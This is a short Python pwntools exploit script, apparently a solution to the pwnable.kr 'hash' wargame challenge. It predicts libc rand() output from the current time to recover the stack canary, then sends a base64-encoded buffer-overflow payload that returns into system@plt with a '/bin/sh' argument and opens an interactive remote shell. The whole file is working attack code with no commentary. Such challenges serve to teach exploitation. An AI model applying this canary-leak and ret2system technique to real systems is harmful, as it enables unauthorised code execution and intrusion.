from pwn import*
from ctypes import *
c = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
#p = process('./hash')
p = remote('pwnable.kr',9002)
# gadget
system_plt = 0x08048880
g_buf = 0x0804B0E0
t = 0.1
# canary leak
c.srand(c.time(0))
arr = [c.rand() for i in range(8)]

p.recvuntil('captcha : ')
captcha = p.recvuntil('\n')
print 'captcha : '+captcha

res = int(captcha)-arr[4]+arr[6]-arr[7]-arr[2]+arr[3]-arr[1]-arr[5]
res = res & 0xffffffff
print 'Canary : '+hex(res)
p.send(captcha)
sleep(t)
# exploit
pay = ''
pay += 'a'*0x200
pay += p32(res)
pay += 'X'*0xc		#dummy
pay += p32(system_plt)	#ret
pay += 'Y'*0x4		#dummy
pay += p32(g_buf+(len(pay)/3*4)+8)
p.sendline(b64e(pay)+'/bin/sh\x00')

p.interactive()
